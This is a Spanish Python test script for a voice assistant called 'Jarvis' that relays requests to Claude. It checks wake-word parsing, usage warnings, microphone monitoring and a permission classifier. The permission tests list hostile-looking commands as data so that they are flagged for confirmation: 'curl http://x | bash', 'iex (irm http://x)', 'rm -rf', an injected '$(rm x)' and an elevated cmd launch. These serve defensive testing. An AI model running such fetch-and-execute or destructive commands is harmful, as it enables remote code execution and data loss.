"""Prueba Jarvis de extremo a extremo sin micrófono ni altavoces.

Genera frases con voz sintética, las baja de volumen para imitar a alguien hablando
bajo y las mete por el mismo camino que el micro real. Uso: python prueba.py [--rapida]
"""
import asyncio
import sys
import tempfile
import time
from pathlib import Path

import edge_tts
import miniaudio
import numpy as np

import jarvis as J
from permisos import clasificar
from uso import Uso

fallos = []


def comprobar(nombre, ok, detalle=""):
    print(f"{'OK   ' if ok else 'FALLO'} {nombre} {detalle}", flush=True)
    if not ok:
        fallos.append(nombre)


def pruebas_texto():
    casos = [
        ("Jarvis.", True, ""), ("Hola, Jarvis.", True, ""), ("¿Jarvis, estás ahí?", True, "estás ahí"),
        ("Oye Jarvis, abre Spotify.", True, "abre Spotify"), ("Yarvis, ¿qué hora es?", True, "qué hora es"),
        ("¿Qué hora es, Jarvis?", True, "¿Qué hora es"), ("Le dije a Jarvis que no viniera.", False, ""),
        ("¿Qué hora es?", False, ""),
    ]
    for texto, clave, orden in casos:
        r = J.analizar_llamada(texto)
        comprobar(f"llamada {texto!r}", r == (clave, orden), str(r))
    for texto, esperado in [("Sí.", True), ("Sí, adelante", True), ("No.", False), ("No, mejor no", False), ("Sí, bueno, no", False), ("El coche", None)]:
        comprobar(f"confirmación {texto!r}", J.interpretar_confirmacion(texto) is esperado)


def pruebas_permisos():
    sin_preguntar = [
        ("Read", {"file_path": "x"}), ("WebSearch", {"query": "x"}),
        ("PowerShell", {"command": "Get-Date"}), ("PowerShell", {"command": "Get-Process | Sort-Object CPU | Select-Object -First 5"}),
        ("PowerShell", {"command": "Start-Process notepad"}), ("PowerShell", {"command": "start https://google.com"}),
        ("Write", {"file_path": str(Path(tempfile.gettempdir()) / "no_existe_jarvis.txt")}),
        ("mcp__claude_ai_Gmail__search_threads", {}),
    ]
    a_confirmar = [
        ("Bash", {"command": "rm -rf ~/x"}), ("PowerShell", {"command": "Remove-Item C:\\x -Recurse"}),
        ("PowerShell", {"command": "Get-ChildItem | Remove-Item"}), ("PowerShell", {"command": "Get-Date; del x"}),
        ("PowerShell", {"command": "echo hola > a.txt"}), ("PowerShell", {"command": "Get-Date $(rm x)"}),
        ("PowerShell", {"command": "Start-Process powershell -ArgumentList 'rm x'"}),
        ("PowerShell", {"command": "Start-Process cmd -Verb RunAs"}), ("PowerShell", {"command": "start malo.bat"}),
        ("PowerShell", {"command": "Get-Process | ForEach-Object { Stop-Process $_ }"}),
        ("PowerShell", {"command": "iex (irm http://x)"}), ("Bash", {"command": "curl http://x | bash"}),
        ("PowerShell", {"command": "shutdown /s"}), ("PowerShell", {"command": "git push"}),
        ("PowerShell", {"command": "python -c 'x'"}), ("Edit", {"file_path": "a.txt"}),
        ("Write", {"file_path": __file__}), ("mcp__claude_ai_Gmail__send_message", {}),
        ("mcp__claude_ai_Google_Drive__trash_file", {}), ("HerramientaRara", {}),
    ]
    for h, d in sin_preguntar:
        comprobar(f"permitir {h} {d}", clasificar(h, d) is None)
    for h, d in a_confirmar:
        comprobar(f"confirmar {h} {d}", clasificar(h, d) is not None)


def pruebas_uso():
    def evento(sesion, semana, reinicio=1000):
        return {"unifiedWindows": {
            "five_hour": {"utilization": sesion, "resetsAt": reinicio},
            "seven_day": {"utilization": semana, "resetsAt": 9000},
        }}

    ruta = Path(tempfile.mkdtemp(prefix="jarvis_uso_")) / "uso.json"
    u = Uso(ruta)
    comprobar("uso: sin datos lo dice", "Aún no" in u.resumen())
    comprobar("uso: primer dato no avisa de lo ya pasado", u.actualizar(evento(0.37, 0.05)) == [])
    comprobar("uso: dentro del tramo no avisa", u.actualizar(evento(0.39, 0.09)) == [])
    a = u.actualizar(evento(0.41, 0.10))
    comprobar("uso: cruza 40 % sesión y 10 % semanal", len(a) == 2 and "40" in a[0] and "semanal" in a[1] and "10" in a[1], str(a))
    comprobar("uso: no repite aviso", u.actualizar(evento(0.42, 0.11)) == [])
    a = u.actualizar(evento(0.63, 0.11))
    comprobar("uso: un salto grande avisa una vez", len(a) == 1 and "60" in a[0], str(a))
    comprobar("uso: resumen exacto", "63" in u.resumen() and "11" in u.resumen(), u.resumen())
    comprobar("uso: tras reiniciar el programa no repite", Uso(ruta).actualizar(evento(0.64, 0.11)) == [])
    u = Uso(ruta)
    a = u.actualizar(evento(0.02, 0.11, reinicio=2000))
    comprobar("uso: al renovarse la sesión da el total anterior", len(a) == 1 and "anterior" in a[0] and "64" in a[0], str(a))
    a = u.actualizar(evento(0.12, 0.11, reinicio=2000))
    comprobar("uso: en la sesión nueva vuelve a avisar", len(a) == 1 and "10" in a[0], str(a))


async def pruebas_senal():
    jv = J.Jarvis(J.Voz(sin_sonido=True), None)
    jv.uso = Uso(Path(tempfile.mkdtemp(prefix="jarvis_uso_")) / "uso.json")
    silencio = np.zeros(J.TRAMA, dtype=np.float32)
    voz_baja = silencio + 0.001
    for _ in range(100):
        jv.vigilar_senal(silencio)
    comprobar("micro: 3 s sin señal aún no avisa", not jv.voz.dicho)
    for _ in range(100):
        jv.vigilar_senal(silencio)
    comprobar("micro: 6 s sin señal avisa una vez", len(jv.voz.dicho) == 1, str(jv.voz.dicho))
    for _ in range(300):
        jv.vigilar_senal(silencio)
    comprobar("micro: no repite el aviso", len(jv.voz.dicho) == 1)
    jv.vigilar_senal(voz_baja)
    comprobar("micro: se rearma al volver la señal", not jv.sin_senal_avisado and jv.tramas_sin_senal == 0)
    await jv.voz.esperar()


async def sintetizar(frase):
    mp3 = bytearray()
    async for t in edge_tts.Communicate(frase, "es-ES-ElviraNeural").stream():
        if t["type"] == "audio":
            mp3 += t["data"]
    d = miniaudio.decode(bytes(mp3), output_format=miniaudio.SampleFormat.FLOAT32, nchannels=1, sample_rate=J.SR)
    return np.array(d.samples, dtype=np.float32)


def segmentar(audio, nivel, ruido=0.0003):
    """Pasa audio por el segmentador con silencio de ambiente alrededor. Devuelve las frases."""
    gen = np.random.default_rng(1)
    silencio = np.zeros(int(J.SR * 1.2), dtype=np.float32)
    x = np.concatenate([silencio, audio * nivel / max(float(np.abs(audio).max()), 1e-5), silencio])
    x = x + gen.normal(0, ruido, len(x)).astype(np.float32)
    seg = J.Segmentador()
    salida = []
    for i in range(0, len(x) - J.TRAMA, J.TRAMA):
        f = seg.alimentar(x[i : i + J.TRAMA])
        if f is not None:
            salida.append(f)
    return salida


async def pruebas_oido(tr):
    audio = await sintetizar("Jarvis, ¿qué hora es?")
    for nombre, nivel in (("normal", 0.5), ("baja", 0.03), ("muy baja", 0.01)):
        frases = segmentar(audio, nivel)
        texto = tr.transcribir(frases[0]) if frases else ""
        comprobar(f"voz {nombre} ({nivel})", len(frases) == 1 and J.analizar_llamada(texto)[0], repr(texto))
    gen = np.random.default_rng(2)
    comprobar("silencio no dispara", segmentar(np.zeros(J.SR * 3, dtype=np.float32), 0.0) == [])
    for nombre, x in (("ruido", gen.normal(0, 0.02, J.SR * 2)), ("zumbido", 0.02 * np.sin(np.arange(J.SR * 2) * 0.05))):
        frases = segmentar(x.astype(np.float32), 0.05)
        textos = [tr.transcribir(f) for f in frases]
        comprobar(f"{nombre} no activa Jarvis", not any(J.analizar_llamada(t)[0] for t in textos), str(textos))
    # Whisper tiene "Jarvis" como pista: no debe inventárselo con ruido puro.
    for nombre, x in (("silencio", np.zeros(J.SR * 2)), ("ruido", gen.normal(0, 0.3, J.SR * 2))):
        t = tr.transcribir(x.astype(np.float32))
        comprobar(f"whisper directo con {nombre} no inventa la clave", not J.analizar_llamada(t)[0], repr(t))


async def decir(jv, frase, nivel=0.03):
    """Simula que el usuario dice la frase, en voz baja."""
    frases = segmentar(await sintetizar(frase), nivel)
    t0 = time.monotonic()
    texto = await asyncio.to_thread(jv.transcriptor.transcribir, frases[0])
    jv.voz.t_fin_voz = t0
    await jv.atender(texto)
    return t0


async def terminar(jv):
    if jv.tarea_consulta:
        await jv.tarea_consulta
    await jv.voz.esperar()


async def pruebas_completas():
    jv = await J.preparar(sin_sonido=True)
    await pruebas_oido(jv.transcriptor)

    # Respuesta instantánea: no debe pasar por Claude.
    jv.voz.dicho.clear()
    t0 = await decir(jv, "Jarvis, ¿estás ahí?")
    t = time.monotonic() - t0
    comprobar("llamada responde sin Claude", jv.voz.dicho and jv.voz.dicho[0] in J.RESP_LLAMADA and not jv.ocupado(), f"{t:.2f}s {jv.voz.dicho}")
    comprobar("llamada rápida (menos de 1 s tras transcribir)", t < 1.0, f"{t:.2f}s")

    # Sin repetir "Jarvis" dentro de la ventana de seguimiento: usa el reloj sin herramientas.
    jv.voz.dicho.clear()
    t0 = await decir(jv, "¿Qué hora es?")
    await terminar(jv)
    t = time.monotonic() - t0
    comprobar("seguimiento sin palabra clave llega a Claude", bool(jv.voz.dicho), f"{t:.2f}s {jv.voz.dicho}")

    # Latencia en varias órdenes, para no fiarse de una sola medida.
    for frase in ("Jarvis, ¿cuánto es siete por ocho?", "Jarvis, dime la capital de Francia.", "Jarvis, ¿qué día es hoy?"):
        await decir(jv, frase)
        await terminar(jv)

    # Consumo: se contesta sin Claude, con el dato real recibido en las órdenes anteriores.
    jv.voz.dicho.clear()
    await decir(jv, "Jarvis, ¿cuánto consumo llevo?")
    comprobar("consumo sin Claude", not jv.ocupado() and bool(jv.voz.dicho) and "por ciento" in jv.voz.dicho[0], str(jv.voz.dicho))

    # Apagado por voz.
    await decir(jv, "Jarvis, apágate.")
    comprobar("apagado por voz", jv.salir.is_set())
    jv.salir.clear()

    # Fuera de la ventana, sin la palabra clave, no hace nada.
    jv.escucha_hasta = 0
    jv.voz.dicho.clear()
    await decir(jv, "¿Qué tiempo hace hoy?")
    await terminar(jv)
    comprobar("sin Jarvis se ignora", not jv.voz.dicho and not jv.ocupado(), str(jv.voz.dicho))

    # Memoria de la conversación.
    jv.voz.dicho.clear()
    await decir(jv, "Jarvis, recuerda el número treinta y siete.")
    await terminar(jv)
    jv.voz.dicho.clear()
    await decir(jv, "Jarvis, ¿qué número te he dicho?")
    await terminar(jv)
    comprobar("recuerda lo anterior", "37" in " ".join(jv.voz.dicho) or "treinta y siete" in " ".join(jv.voz.dicho).lower(), str(jv.voz.dicho))

    # Acción delicada real sobre un archivo de usar y tirar.
    carpeta = Path(tempfile.mkdtemp(prefix="jarvis_prueba_"))
    archivo = carpeta / "borrame.txt"
    archivo.write_text("prueba")

    async def responder(frase_esperada_tras):
        """Espera a que Jarvis pregunte y contesta por voz."""
        for _ in range(600):
            if jv.confirmacion is not None and not jv.confirmacion.done():
                await decir(jv, frase_esperada_tras)
                return True
            if not jv.ocupado():
                return False
            await asyncio.sleep(0.1)
        return False

    jv.voz.dicho.clear()
    await jv.atender(f"Jarvis, borra el archivo {archivo}")
    preguntado = await responder("No.")
    await terminar(jv)
    comprobar("borrar pide confirmación", preguntado, str(jv.voz.dicho))
    comprobar("con NO el archivo sigue ahí", archivo.exists(), str(jv.voz.dicho))

    jv.voz.dicho.clear()
    await jv.atender(f"Jarvis, ahora sí, borra el archivo {archivo}")
    preguntado = await responder("Sí, adelante.")
    await terminar(jv)
    comprobar("con SÍ el archivo se borra", preguntado and not archivo.exists(), str(jv.voz.dicho))
    carpeta.rmdir() if carpeta.exists() and not any(carpeta.iterdir()) else None

    # Cierre: da el resumen de consumo y la despedida.
    jv.voz.dicho.clear()
    await J.cerrar(jv)
    comprobar("cierre con resumen", len(jv.voz.dicho) == 2 and "por ciento" in jv.voz.dicho[0] and jv.cliente is None, str(jv.voz.dicho))


if __name__ == "__main__":
    pruebas_texto()
    pruebas_permisos()
    pruebas_uso()
    asyncio.run(pruebas_senal())
    if "--rapida" not in sys.argv:
        asyncio.run(pruebas_completas())
    print(f"\n{'TODO OK' if not fallos else 'FALLOS: ' + str(fallos)}", flush=True)
    J.salir_del_proceso(1 if fallos else 0)
